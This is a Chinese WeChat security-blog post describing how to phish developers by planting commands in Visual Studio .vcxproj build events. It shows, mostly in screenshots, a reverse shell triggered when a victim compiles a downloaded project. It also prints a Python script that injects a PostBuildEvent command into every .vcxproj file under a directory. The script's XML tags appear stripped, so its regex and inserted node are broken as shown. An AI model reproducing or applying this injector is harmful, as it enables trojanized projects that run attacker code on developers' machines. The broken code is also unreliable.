#  Visual Studio项目钓鱼

原创 zkaq-camer  [ 掌控安全EDU ](javascript:void\(0\);)

**掌控安全EDU** ![]()

微信号 ZKAQEDU

功能介绍 安全教程\高质量文章\面试经验分享，尽在#掌控安全EDU#

____

___发表于_

收录于合集

获网安教程

免费&进群

![](https://gitee.com/fuli009/images/raw/master/public/20230714175239.png)
![](https://gitee.com/fuli009/images/raw/master/public/20230714175240.png)  
本文由掌控安全学院-camer投稿，文章灵感来自 apt-38 钓鱼样本。

# 0x01 漏洞成因

漏洞的形成主要是因为Visual Studio的项目文件（vcxproj）是基于XML格式的，XML文件本身并不包含可执行代码。然而，Visual
Studio的XML解析器允许在项目文件中包含一些自定义的命令，这些命令可以在构建项目时被执行。

# 0x02 漏洞复现

正常情况下使用Visual Studio去编译github上下载的项目

![]()  
通过修改Visual Studio的项目文件（vcxproj)植入恶意命令

![](https://gitee.com/fuli009/images/raw/master/public/20230714175241.png)

当项目被下载编译时机会执行命令

![](https://gitee.com/fuli009/images/raw/master/public/20230714175242.png)

# 0x03 漏洞利用

可以直接反弹shell，通过hoaxshell直接生成powershell，并开启监听

![](https://gitee.com/fuli009/images/raw/master/public/20230714175243.png)

将代码插入Visual Studio的项目文件（vcxproj）的XML标签中

![](https://gitee.com/fuli009/images/raw/master/public/20230714175246.png)

直接编译，终端反弹shell

![](https://gitee.com/fuli009/images/raw/master/public/20230714175247.png)

漏洞利用脚本：

    
          1. import argparse
    
      2. import os
    
      3. import re
    
      4.   5. # 解析命令行参数
    
      6. parser = argparse.ArgumentParser(description='Insert PostBuildEvent node into .vcxproj files.')
    
      7. parser.add_argument('-d', '--directory', metavar='directory', type=str, default='.', help='the directory to search for .vcxproj files')
    
      8. parser.add_argument('-c', '--command', metavar='command', type=str, default='calc.exe', help='the command to be executed in the PostBuildEvent node')
    
      9. args = parser.parse_args()
    
      10.   11. # 定义正则表达式，用于匹配.vcxproj文件中的标签
    
      12. property_group_pattern = re.compile(r'\s*')
    
      13.   14. # 定义插入的节点内容
    
      15. post_build_event_node = '\n\n  \n    {command}\n  \n\n'.format(command=args.command)
    
      16.   17. # 遍历指定目录下的所有文件和子目录
    
      18. for root, dirs, files in os.walk(args.directory):
    
      19.     # 遍历当前目录下的所有文件
    
      20.     for file in files:
    
      21.         # 如果文件扩展名是.vcxproj，则进行处理
    
      22.         if file.endswith('.vcxproj'):
    
      23.             file_path = os.path.join(root, file)
    
      24.             # 打开文件，读取全部内容
    
      25.             with open(file_path, 'r', encoding='utf-8') as f:
    
      26.                 content = f.read()
    
      27.             # 在标签后插入节点
    
      28.             new_content = property_group_pattern.sub(post_build_event_node + '\\g', content)
    
      29.             # 如果文件内容有变化，则写回文件
    
      30.             if new_content != content:
    
      31.                 with open(file_path, 'w', encoding='utf-8') as f:
    
      32.                     f.write(new_content)
    
    
    

  

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

![](https://gitee.com/fuli009/images/raw/master/public/20230714175248.png)  

 **没看够~？欢迎关注！**

  

  

 **分享本文到朋友圈，可以凭截图找老师领取**

上千 **教程+工具+交流群+靶场账号** 哦



![](https://gitee.com/fuli009/images/raw/master/public/20230714175239.png)

 ** ** **分享后扫码 加我！**

  

 **回顾往期内容**

[Xray挂机刷漏洞](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247504665&idx=1&sn=eb88ca9711e95ee8851eb47959ff8a61&chksm=fa6baa68cd1c237e755037f35c6f74b3c09c92fd2373d9c07f98697ea723797b73009e872014&scene=21#wechat_redirect)  

[零基础学黑客，该怎么学？](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487576&idx=1&sn=3852f2221f6d1a492b94939f5f398034&chksm=fa686929cd1fe03fcb6d14a5a9d86c2ed750b3617bd55ad73134bd6d1397cc3ccf4a1b822bd4&scene=21#wechat_redirect)

[网络安全人员必考的几本证书！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247520349&idx=1&sn=41b1bcd357e4178ba478e164ae531626&chksm=fa6be92ccd1c603af2d9100348600db5ed5a2284e82fd2b370e00b1138731b3cac5f83a3a542&scene=21#wechat_redirect)  

[文库｜内网神器cs4.0使用说明书](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247519540&idx=1&sn=e8246a12895a32b4fc2909a0874faac2&chksm=fa6bf445cd1c7d53a207200289fe15a8518cd1eb0cc18535222ea01ac51c3e22706f63f20251&scene=21#wechat_redirect)  

[代码审计 |
这个CNVD证书拿的有点轻松](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503150&idx=1&sn=189d061e1f7c14812e491b6b7c49b202&chksm=fa6bb45fcd1c3d490cdfa59326801ecb383b1bf9586f51305ad5add9dec163e78af58a9874d2&scene=21#wechat_redirect)

[【精选】SRC快速入门+上分小秘籍+实战指南](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247512593&idx=1&sn=24c8e51745added4f81aa1e337fc8a1a&chksm=fa6bcb60cd1c4276d9d21ebaa7cb4c0c8c562e54fe8742c87e62343c00a1283c9eb3ea1c67dc&scene=21#wechat_redirect)

## [    代理池工具撰写 |
只有无尽的跳转，没有封禁的IP！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503462&idx=1&sn=0b696f0cabab0a046385599a1683dfb2&chksm=fa6bb717cd1c3e01afc0d6126ea141bb9a39bf3b4123462528d37fb00f74ea525b83e948bc80&scene=21#wechat_redirect)

![](https://gitee.com/fuli009/images/raw/master/public/20230714175248.png)

点赞+在看支持一下吧~感谢看官老爷~

你的点赞是我更新的动力

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

